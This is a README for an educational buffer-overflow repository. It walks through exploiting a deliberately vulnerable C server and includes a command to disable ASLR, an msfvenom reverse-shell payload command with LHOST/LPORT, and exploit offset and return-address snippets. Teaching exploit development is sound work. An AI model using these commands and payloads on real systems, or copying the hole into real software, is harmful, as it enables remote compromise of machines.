# BufferOverflow
***Buffer Overflow Python Scripts***

*Copyright (C) 2022  Dale Furneaux (opinfosec)*
*Released under GNU GPL v2*

This runs on Linux (intel architecture)


## A word of caution
The server.c is exploitable and containes a buffer overflow.  Please don't run the program on any public facing machine.  I should not have to say this, but you never know what some people might do!!  I use this repo for teaching others about the importance of preventing exploitable code.  If you have participated in the presentation and you enjoyed it, please star this repo and let others know about its existence.

## OS Protections
Don't forget to turn of ASLR if running on linux, this will temporarily disable ASLR.  Don't do this on a production server please!!!

```sh
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Python Scripts

Don't forget to change the IP address of the server

```python
s.connect(("172.16.110.135", 1337))
```

## Logical progression of a buffer overflow exploit
The logical progression of tests should be:

1. fuzzer (fuzz)
2. test for bad characters
3. pattern to determine the EIP offset
4. confirm the EIP with eip-test
5. generate our EvIl payload
6. find our opcode (jmp EAX) to jump to our exploit code
7. ExPlOiT

## Fuzzer

Python3 Fuzzer to enable a buffer overflow and get a general idea of the number of bytes it takes to overflow the buffer and casue a segmentation fault.

## Pattern Generator

Finds the correct offset of the EIP register which is used to load the EIP register with our jmp instruction.

## Bad Character Generator for Python3

Just a badcharacter generator to copy and paste into your bad character python script

## Test for bad character

This sends every bad character in a buffer overflow, which should be checked in the debugger to make sure they all arrive.  If the program doesn't crash or some characters don't appear, then we need to exclude them (bad characters) when we generate our payload.  The server.c does not have any bad characters except 0x00 (NULL), which should be obvious as we are sending a string.

## Eip Test

Verification of the Control of EIP register (the original return address location on the stack)

Adjust the filler to enable the overflow, the EIP offset is taken from the Pattern Generator offset. 
```sh
$ msf-pattern_create -l 1040
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A ...
  
$ msf_pattern_offset -l 1040 -q <VALUE IN EIP REGISTER>
```
```python
filler = "A" * 1036
```

## BoF Exploit local and reverse shell

Simple BoF Exploit for server

Let the fun begin!!!

Don't forget to update the payload_shell with your own msfvenom generated reverse shell payload, notice we exlude the bad character 0x00 (NULL)
```sh
$ msfvenom -p linux/x86/shell_reverse_tcp  LHOST=172.16.110.1 LPORT=4242 -b '\x00' -f c -v payload_shell
```
where LMHOST=172.16.110.1 is your host ip where you want to get a reverse shell returned and the port LPORT=4242

Adjust the filler buffer to enable the overflow, adjust the eip address to pint to our found opcode (JMP EAX)
You can optionall add the extend to create an additional area at the end of the buffer after the EIP return, like we did in the eip-test.py script.
(this is not necessary, however it keeps the original BoF intact)
```python
filler = "A" * (1036 - ((len(nop_sled)) + len(payload_shell)))  # Filler 1036 Bytes - nop sled - size of payload
eip = "\x6f\x9b\x04\x08"    #0x08049b6f  Return Address JMP EAX
```
The NOP sled is used to allow variables to be place on the stack without overwriting the payload.  NOP stands for no-operation... the execution by the CPU does not change the state of the registers, esentially executing a NULL statement.

We now need to jmp to our executable code that we generated.  One might thing that we can just jump to the address at the top of the stack, and while it seems logical at first, there is a fundamental flaw in this thinking.  The reasone we can't just jump to the address where our shell code is residing, is that we can not guarantee that the address of the top of the stack will be the same the next time the executable is run.  Imagine during one execution the top of the stack is located at 0xbff38538 and we hard code that into the eip, but the next time the executable runs the top of the stack is located somewhere else.  The eip would not execute your shell code as it jumps to somewhere else, and therefore is not reliable.  We need to find a reliable way to jump to our shell code.  Enter in the opcode to jump.  If we noticed during our buffer overflow in the debugger, the EAX register was pointing to the top of the stack, so we need to find an opcode that jumps to EAX (jmp EAX).  We can search our executable and find an existing jmp EAX and use that address in the EIP to jump to the opcode jmp EAX, which in turn jumps to the top of the stack where our shell code is located, and bingo our shell code is executed.

Also note that the eip address is stored backwards due to little endian (intel architecture)

## Server (server.c)

This is our fantastic C program, with excellent quality and lots of testing prior to the long holiday weekend.  Because the offices will be closed over the weekend, we had to rush and deploy the server on 50 machines to minimize any disruptions over the weekend.  The Quality, IT and Testing departments said it was good to go, and it was easy to test...

We came back into the office on Monday, and all 50 of our servers were hacked... not to mention our internal network, voip, databases, and a few of our clients.  One of my developer friends took a look at the code and said to me "I hope you didn't deploy that sofware on any internet facing machines."..  I of course said No, with a nervous smile.

I have spent hours looking for the problem, but I can't see any.  The server recieves only 100 Bytes from our client application, so there is no way it will crash.  Can you spot the problem?

To make the server executable (which runs on linux), use the attached make file and execute:

```sh
$ make clean && make all
```

Then use a debugger such as Olly or edb to run the server executable and test out the python scripts.


\<opsecinfosec\> @  42-AbuDhabi
